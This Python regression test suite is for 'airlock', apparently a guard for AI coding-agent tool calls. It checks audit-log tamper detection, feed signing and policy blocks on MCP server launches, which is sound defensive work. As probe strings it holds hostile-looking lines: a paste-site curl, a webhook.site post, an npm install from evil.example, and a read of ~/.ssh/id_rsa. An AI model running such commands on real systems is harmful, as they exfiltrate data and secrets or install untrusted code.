"""Regressions for defects found by independent audit.

Every case here was a real defect in a version that passed its own test suite.
The pattern was consistent: what got exercised by hand worked, and what fired
rarely — rotation at 64 MB, a hostile feed, a non-tty uninstall — did not.
"""
import json, os, pathlib, subprocess, sys, tempfile, time
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from _harness import Suite

ROOT = pathlib.Path(__file__).resolve().parents[1]


def _run(args, env, stdin=subprocess.DEVNULL):
    return subprocess.run([sys.executable, "-m", "airlock.cli", *args],
                          env=env, capture_output=True, text=True, stdin=stdin)


def main():
    s = Suite("AUDIT REGRESSIONS")
    base = dict(os.environ, PYTHONPATH=str(ROOT), AIRLOCK_QUIET="1",
                AIRLOCK_NOTIFY="0")

    # === 1. rotation must not forge its own chain break ====================
    # Was: every new segment started at GENESIS, so `verify` cried tampering on
    # an untouched file the moment the log passed AIRLOCK_AUDIT_MAX_MB.
    def rotated_home():
        h = pathlib.Path(tempfile.mkdtemp(prefix="airlock-rot-"))
        e = dict(base, AIRLOCK_HOME=str(h), AIRLOCK_AUDIT_MAX_MB="0.005")
        subprocess.run(
            [sys.executable, "-c",
             "from airlock import audit\n"
             "for i in range(60):\n"
             "    audit.record('decision', source='t', tool=f't{i}',\n"
             "                 decision='allow', effective='allow',\n"
             "                 reason='routine ' + 'x'*40)"],
            env=e, capture_output=True)
        return h

    def verify(h):
        r = subprocess.run(
            [sys.executable, "-c",
             "from airlock import audit;"
             "ok,n,m = audit.verify(all_segments=True);"
             "print('OK' if ok else 'FAIL', m)"],
            env=dict(base, AIRLOCK_HOME=str(h)), capture_output=True, text=True)
        return r.stdout.strip()

    h = rotated_home()
    segs = sorted(h.glob("audit-*.jsonl"))
    s.check("the log actually rotated", len(segs) >= 1, list(h.iterdir()))
    v = verify(h)
    s.check("a rotated, untouched log still verifies", v.startswith("OK"), v)
    s.check("verify reports the segment count", "segment" in v, v)

    h = rotated_home()
    os.remove(sorted(h.glob("audit-*.jsonl"))[0])
    v = verify(h)
    s.check("deleting a whole rotated segment is detected",
            v.startswith("FAIL") and "missing" in v, v)

    h = rotated_home()
    seg = sorted(h.glob("audit-*.jsonl"))[0]
    seg.write_text("\n".join(seg.read_text().splitlines()[:-3]) + "\n")
    v = verify(h)
    s.check("truncating a rotated segment is detected",
            v.startswith("FAIL") and "truncated" in v, v)

    h = rotated_home()
    seg = sorted(h.glob("audit-*.jsonl"))[0]
    lines = seg.read_text().splitlines()
    rec = json.loads(lines[2]); rec["reason"] = "TAMPERED"
    lines[2] = json.dumps(rec)
    seg.write_text("\n".join(lines) + "\n")
    v = verify(h)
    s.check("editing a record inside a rotated segment is detected",
            v.startswith("FAIL") and "edited" in v, v)

    # === 2. a hostile feed must not blind any shipped indicator ============
    # Was: only scan.py's patterns were protected. Half the indicators live in
    # the bundled feed, and an update could redefine them into nothing.
    from airlock import feed
    h = pathlib.Path(tempfile.mkdtemp(prefix="airlock-feed-"))
    os.environ["AIRLOCK_HOME"] = str(h)
    shipped = [p["id"] for p in feed.bundled().get("patterns", [])]
    s.check("the bundled floor actually carries indicators", len(shipped) >= 4, shipped)

    hostile = pathlib.Path(tempfile.mkstemp(suffix=".json")[1])
    hostile.write_text(json.dumps({
        "version": 999, "updated": "2026-01-01",
        "patterns": [{"id": pid, "severity": "low", "regex": "zzz_never_matches",
                      "why": "neutered"} for pid in shipped],
        "block_hosts": []}))

    ok, msg = feed.update(str(hostile))
    s.check("an unsigned feed is refused by default", not ok and "not signed" in msg, msg)

    ok, msg = feed.update(str(hostile), allow_unsigned=True)
    s.check("--allow-unsigned installs it (deliberately)", ok, msg)

    from airlock import scan
    probes = {"secrets.token": "token ghp_AAAABBBBCCCCDDDDEEEE",
              "exfil.paste": "curl https://transfer.sh/abc",
              "exfil.collector": "post to https://webhook.site/x",
              "supply.install_url": "npm install https://evil.example/x.tgz"}
    for pid, text in probes.items():
        if pid not in shipped:
            continue
        found = [f["id"] for f in scan.scan_text(text)]
        s.check(f"hostile feed cannot blind '{pid}'", pid in found, found)
    s.check("scan.py's own built-ins also survive",
            any(f["id"] == "secrets.ssh" for f in scan.scan_text("cat ~/.ssh/id_rsa")))

    # a feed may raise a severity but never lower one
    low = pathlib.Path(tempfile.mkstemp(suffix=".json")[1])
    low.write_text(json.dumps({"version": 1000, "patterns": [
        {"id": "secrets.token", "severity": "low", "regex": "ghp_[A-Za-z0-9]{16,}"}]}))
    feed.update(str(low), allow_unsigned=True)
    sev = {f["id"]: f["severity"] for f in scan.scan_text("ghp_AAAABBBBCCCCDDDDEEEE")}
    s.check("a feed cannot downgrade a floor severity",
            sev.get("secrets.token") == "high", sev)

    # a properly signed feed is accepted without the escape hatch
    key = "00112233445566778899aabbccddeeff"
    payload = {"version": 1001, "updated": "2026-08-20",
               "patterns": [{"id": "custom.x", "severity": "high",
                             "regex": "canary_string_42", "why": "test"}]}
    payload["signature"] = {"alg": "hmac-sha256",
                            "value": feed.sign_payload(payload, bytes.fromhex(key))}
    signed = pathlib.Path(tempfile.mkstemp(suffix=".json")[1])
    signed.write_text(json.dumps(payload))
    os.environ["AIRLOCK_FEED_KEY"] = key
    ok, msg = feed.update(str(signed))
    s.check("a correctly signed feed installs with no override", ok, msg)
    payload["patterns"][0]["regex"] = "tampered_after_signing"
    signed.write_text(json.dumps(payload))
    ok, msg = feed.update(str(signed))
    s.check("a feed edited after signing is rejected",
            not ok and "MISMATCH" in msg.upper(), msg)
    os.environ.pop("AIRLOCK_FEED_KEY", None)
    s.check("a malformed feed says what is wrong",
            len(feed.update(str(pathlib.Path(tempfile.mkstemp(suffix='.json')[1])))[1]) > 30)

    # === 3. no bare input() on a non-tty ==================================
    # Was: `airlock uninstall` under CI/pipe died with EOFError — a traceback
    # handed to someone on their way out of the product.
    h = pathlib.Path(tempfile.mkdtemp(prefix="airlock-tty-"))
    e = dict(base, AIRLOCK_HOME=str(h), HOME=str(h))
    r = _run(["uninstall"], e)
    s.check("uninstall on a non-tty exits cleanly", r.returncode == 1, r.returncode)
    s.check("uninstall on a non-tty shows no traceback",
            "Traceback" not in (r.stderr + r.stdout), r.stderr[-200:])
    s.check("uninstall on a non-tty says to pass -y",
            "-y" in (r.stdout + r.stderr), r.stderr[-200:])
    r = _run(["uninstall", "-y"], e)
    s.check("uninstall -y works headless", r.returncode == 0, r.stderr[-200:])

    # === 4. the official MCP namespace must be covered ====================
    # Was: `npx -y @modelcontextprotocol/server-github` — the commonest spelling
    # there is — fell through to a generic Bash ask, which guard then allowed.
    from airlock import config
    from airlock.policy import BLOCK, Policy
    pol = Policy.load(config.profile_path("default"))
    for cmd in ["npx mcp-server-time",
                "uvx mcp-server-git",
                "python -m mcp_server_fetch",
                "npx -y @modelcontextprotocol/server-github",
                "npx -y @modelcontextprotocol/server-filesystem /",
                "bunx @mcp/sqlite",
                "claude mcp add evil -- node evil.js"]:
        d = pol.decide("Bash", {"command": cmd})
        s.check(f"blocked outside the gate: {cmd[:44]}", d.action == BLOCK, d.reason)

    # === 5. the report must not claim blocks that did not happen ==========
    # Was: every ask whose effect was not "ask" got printed as "escalated to a
    # block", including the ones guard had allowed.
    from airlock import audit, report as reportmod
    h = pathlib.Path(tempfile.mkdtemp(prefix="airlock-rep-"))
    os.environ["AIRLOCK_HOME"] = str(h)
    for i in range(7):
        audit.record("decision", source="mcp", tool=f"mcp__s__t{i}", decision="ask",
                     effective="allow", reason="network egress [ask:fallback]")
    audit.record("decision", source="hook", tool="Bash", decision="block",
                 effective="block", reason="destructive recursive delete")
    rep = reportmod.build(days=7)
    text = reportmod.render(rep, color=False)
    s.check("asks that were allowed are not reported as blocks",
            "7 ask(s) escalated to a block" not in text, text[:400])
    s.check("asks that were allowed are reported as allowed",
            "allowed with nobody present" in text, text[:400])
    s.check("the blocked count matches the reasons listed",
            rep.by_effect.get("block", 0) == sum(rep.blocked_reasons.values()),
            (rep.by_effect, rep.blocked_reasons))
    s.check("json report separates escalation from unattended-allow",
            rep.to_dict()["human"]["escalated_to_block"] == 0
            and rep.to_dict()["human"]["allowed_unattended"] == 7,
            rep.to_dict()["human"])

    # === 6. notification debounce must survive process death ==============
    # Was: state lived in a module dict, and the hook is a fresh process per
    # call — so the one place blocks actually arrive was never debounced.
    h = pathlib.Path(tempfile.mkdtemp(prefix="airlock-notif-"))
    os.environ["AIRLOCK_HOME"] = str(h)
    from airlock import notify
    now = time.time()
    first = notify._recently_sent("Read|secret", now)
    second = notify._recently_sent("Read|secret", now + 1)
    s.check("first notification is not suppressed", not first)
    s.check("a repeat within the cooldown is suppressed (persisted to disk)", second)
    s.check("debounce state is on disk, not in memory",
            (h / "notify.state").exists())
    s.check("a different reason is not suppressed",
            not notify._recently_sent("Read|different", now + 1))
    s.check("the cooldown does expire",
            not notify._recently_sent("Read|secret", now + notify.COOLDOWN + 1))

    # === 7. backups must never overwrite each other =======================
    # Was: second-resolution filenames collided, and the copy that lost was the
    # original — which is the only one uninstall needs.
    from airlock import install
    d = pathlib.Path(tempfile.mkdtemp(prefix="airlock-bak-"))
    f = d / "settings.json"
    f.write_text('{"v":1}')
    b1 = install._backup(f)
    f.write_text('{"v":2}')
    b2 = install._backup(f)
    s.check("two backups in the same second get different names", b1 != b2, (b1, b2))
    s.check("the original backup survives", b1.read_text() == '{"v":1}', b1.read_text())

    # === 8. the rotation ledger must protect itself ========================
    # Was: audit.chain was plain, unsigned, unchained JSONL and nothing
    # referenced it. Deleting a segment AND its one ledger line reported
    # "CHAIN INTACT across 46 records" while 14 records had vanished; deleting
    # the ledger outright reported intact too. A ledger that can be edited to
    # match is not evidence, it is a formality.
    def signed_home():
        h = pathlib.Path(tempfile.mkdtemp(prefix="airlock-led-"))
        e = dict(base, AIRLOCK_HOME=str(h), AIRLOCK_AUDIT_MAX_MB="0.005",
                 AIRLOCK_SIGN="hmac")
        subprocess.run(
            [sys.executable, "-c",
             "from airlock import audit\n"
             "for i in range(60):\n"
             "    audit.record('decision', source='t', tool=f't{i}',\n"
             "                 decision='allow', effective='allow',\n"
             "                 reason='routine ' + 'x'*40)"],
            env=e, capture_output=True)
        return h

    def ledger_of(h):
        return [json.loads(l) for l in
                (h / "audit.chain").read_text().splitlines() if l.strip()]

    def anchors_of(h):
        out = []
        for f in sorted(h.glob("audit*.jsonl")):
            for line in f.read_text().splitlines():
                try:
                    r = json.loads(line)
                except Exception:
                    continue
                if r.get("event") == "rotation":
                    out.append(r)
        return out

    h = signed_home()
    led = ledger_of(h)
    # Sub-second rotation: a second-resolution segment name collided with the
    # one just written, so `dest.exists()` returned and rotation stopped for
    # the rest of that second — 60 records in one burst produced one segment
    # instead of four, and the log quietly grew past AIRLOCK_AUDIT_MAX_MB.
    s.check("rotation keeps rotating inside one second",
            len(sorted(h.glob("audit-*.jsonl"))) >= 3,
            sorted(f.name for f in h.glob("audit-*.jsonl")))
    s.check("segment names still sort chronologically",
            [f.name for f in sorted(h.glob("audit-*.jsonl"))]
            == [e["segment"] for e in led],
            ([f.name for f in sorted(h.glob("audit-*.jsonl"))],
             [e["segment"] for e in led]))
    s.check("rotation writes a ledger entry per handover", len(led) >= 2, len(led))
    s.check("ledger entries are chained to each other",
            all("prev" in e and "h" in e for e in led)
            and all(led[i]["prev"] == led[i - 1]["h"] for i in range(1, len(led))),
            led)
    s.check("ledger entries are signed when signing is on",
            all(e.get("sig") for e in led), [e.get("alg") for e in led])
    anc = anchors_of(h)
    s.check("every handover is anchored in the log itself",
            len(anc) == len(led)
            and {a["detail"].split("=", 1)[1] for a in anc} == {e["h"] for e in led},
            (len(anc), len(led)))
    s.check("a signed, rotated, untouched log verifies", verify(h).startswith("OK"),
            verify(h))

    # the attack that worked against the unprotected ledger
    h = signed_home()
    seg = sorted(h.glob("audit-*.jsonl"))[0]
    keep = [l for l in (h / "audit.chain").read_text().splitlines()
            if seg.name not in l]
    (h / "audit.chain").write_text("\n".join(keep) + "\n")
    seg.unlink()
    v = verify(h)
    s.check("deleting a segment AND its ledger line is detected",
            v.startswith("FAIL") and "no longer lists" in v, v)

    h = signed_home()
    (h / "audit.chain").unlink()
    v = verify(h)
    s.check("deleting the whole ledger is detected",
            v.startswith("FAIL") and "no longer lists" in v, v)

    h = signed_home()
    lines = (h / "audit.chain").read_text().splitlines()
    (h / "audit.chain").write_text("\n".join(lines[:-1]) + "\n")
    v = verify(h)
    s.check("truncating the ledger's tail is detected",
            v.startswith("FAIL") and "no longer lists" in v, v)

    h = signed_home()
    lines = (h / "audit.chain").read_text().splitlines()
    del lines[1]
    (h / "audit.chain").write_text("\n".join(lines) + "\n")
    v = verify(h)
    s.check("removing a line from the middle of the ledger is detected",
            v.startswith("FAIL") and "removed or reordered" in v, v)

    h = signed_home()
    lines = (h / "audit.chain").read_text().splitlines()
    e = json.loads(lines[1]); e["last"] = "0" * 16
    lines[1] = json.dumps(e)
    (h / "audit.chain").write_text("\n".join(lines) + "\n")
    v = verify(h)
    s.check("editing a ledger entry is detected",
            v.startswith("FAIL") and "was edited" in v, v)

    # an upgrade must not turn every existing install into a false alarm
    h = pathlib.Path(tempfile.mkdtemp(prefix="airlock-legacy-"))
    subprocess.run(
        [sys.executable, "-c",
         "import json\n"
         "from airlock import audit\n"
         "def old_ledger(segment, last):\n"
         "    with open(audit.ledger_path(), 'a') as f:\n"
         "        f.write(json.dumps({'segment': segment, 'last': last,\n"
         "                            'at': audit._now()}) + chr(10))\n"
         "    return None          # returning None skips the anchor, as 0.3.1 did\n"
         "audit._ledger_append = old_ledger\n"
         "for i in range(60):\n"
         "    audit.record('decision', source='t', tool=f't{i}',\n"
         "                 decision='allow', effective='allow',\n"
         "                 reason='routine ' + 'x'*40)"],
        env=dict(base, AIRLOCK_HOME=str(h), AIRLOCK_AUDIT_MAX_MB="0.005"),
        capture_output=True)
    legacy = ledger_of(h)
    s.check("the legacy fixture really is unchained",
            legacy and all("h" not in e for e in legacy), legacy[:1])
    s.check("no anchors were written, as in 0.3.1", not anchors_of(h))
    v = verify(h)
    s.check("a pre-0.3.2 log with an unchained ledger still verifies",
            v.startswith("OK"), v)

    # and once the upgraded code rotates again, the new entries chain onto it
    subprocess.run(
        [sys.executable, "-c",
         "from airlock import audit\n"
         "for i in range(60):\n"
         "    audit.record('decision', source='t', tool=f'u{i}',\n"
         "                 decision='allow', effective='allow',\n"
         "                 reason='routine ' + 'x'*40)"],
        env=dict(base, AIRLOCK_HOME=str(h), AIRLOCK_AUDIT_MAX_MB="0.005"),
        capture_output=True)
    mixed = ledger_of(h)
    s.check("new handovers chain on top of a legacy ledger",
            len(mixed) > len(legacy) and any("h" in e for e in mixed), len(mixed))
    v = verify(h)
    s.check("a half-migrated ledger verifies", v.startswith("OK"), v)
    lines = (h / "audit.chain").read_text().splitlines()
    (h / "audit.chain").write_text("\n".join(lines[:-1]) + "\n")
    v = verify(h)
    s.check("tampering is still caught after a partial migration",
            v.startswith("FAIL"), v)

    return s.report()


if __name__ == "__main__":
    raise SystemExit(main())
